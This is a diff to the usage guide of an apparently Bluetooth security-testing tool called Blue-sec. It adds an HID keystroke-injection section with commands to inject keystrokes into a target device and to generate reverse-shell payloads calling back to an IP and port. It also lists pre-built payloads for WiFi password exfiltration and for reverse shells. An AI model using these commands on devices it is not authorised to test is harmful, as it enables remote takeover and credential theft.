@@ -1,5 +1,16 @@
 # Blue-sec Usage Guide
 
+## Table of Contents
+
+1. [Installation](#installation)
+2. [Basic Usage](#basic-usage)
+3. [HID Attacks (NEW!)](#hid-attacks)
+4. [Vulnerability Scanning](#vulnerability-scanning)
+5. [Attack Simulation](#attack-simulation)
+6. [Enterprise Features](#enterprise-features)
+
+---
+
 ## Installation
 
 ### Requirements
@@ -69,7 +80,80 @@ Enumerate services and characteristics:
 sudo python3 blue-sec.py info AA:BB:CC:DD:EE:FF --enumerate
 ```
 
-### Vulnerability Scanning
+---
+
+## HID Attacks
+
+**NEW!** Blue-sec now supports real-time HID (keyboard/mouse) attacks similar to BlueDucky and Rubber Ducky.
+
+### Quick Test (Harmless)
+
+Test with a harmless payload:
+
+```bash
+# Rickroll test
+sudo python3 blue-sec.py hid-test AA:BB:CC:DD:EE:FF \
+  --payload data/payloads/hid/rickroll_test.json
+
+# Keyboard test
+sudo python3 blue-sec.py hid-test AA:BB:CC:DD:EE:FF \
+  --payload data/payloads/hid/test_keyboard.json
+```
+
+### Interactive Mode
+
+Start an interactive HID testing session:
+
+```bash
+sudo python3 blue-sec.py hid-test AA:BB:CC:DD:EE:FF --interactive
+```
+
+Commands in interactive mode:
+- `type <text>` - Type text
+- `key <key>` - Press a key
+- `combo CTRL+C` - Key combination
+- `payload <file>` - Execute payload
+- `disconnect` - End session
+
+### Generate Custom Payloads
+
+Create reverse shell payload:
+
+```bash
+sudo python3 blue-sec.py generate-payload \
+  --name "My Shell" \
+  --type reverse_shell \
+  --os linux \
+  --ip 192.168.1.100 \
+  --port 4444 \
+  --output my_payload.json
+```
+
+Generate info gathering payload:
+
+```bash
+sudo python3 blue-sec.py generate-payload \
+  --name "System Info" \
+  --type info_gather \
+  --os windows \
+  --output sysinfo.json
+```
+
+### Available Payloads
+
+Pre-built payloads in `data/payloads/hid/`:
+- `test_keyboard.json` - Keyboard functionality test
+- `rickroll_test.json` - Harmless demonstration
+- `info_gather_windows.json` - System information gathering
+- `wifi_exfil_windows.json` - WiFi password extraction
+- `reverse_shell_linux.json` - Linux reverse shell
+- `reverse_shell_windows.json` - Windows reverse shell
+
+**See [HID_ATTACKS.md](HID_ATTACKS.md) for comprehensive HID attack documentation.**
+
+---
+
+## Vulnerability Scanning
 
 Scan a device for known vulnerabilities:
 
